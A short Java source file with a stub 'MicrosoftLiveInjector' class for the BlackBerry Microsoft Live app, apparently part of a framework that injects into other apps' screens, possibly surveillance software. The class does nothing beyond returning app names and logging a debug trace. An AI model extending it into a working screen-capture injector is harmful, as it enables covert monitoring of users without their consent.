package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class MicrosoftLiveInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("MicrosoftLiveInjector",
            DebugLevel.VERBOSE);

    public boolean enabled(){
        return false;
    }
    
    //#endif
    public String getAppName() {
        return "net_rim_bb_mslive";
    }

    public String[] getWantedScreen() {
        // TODO Auto-generated method stub
        return new String[0];
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen");
        //#endif
    }

    public String getCodName() {
        // TODO Auto-generated method stub
        return "net_rim_bb_mslive";
    }

}
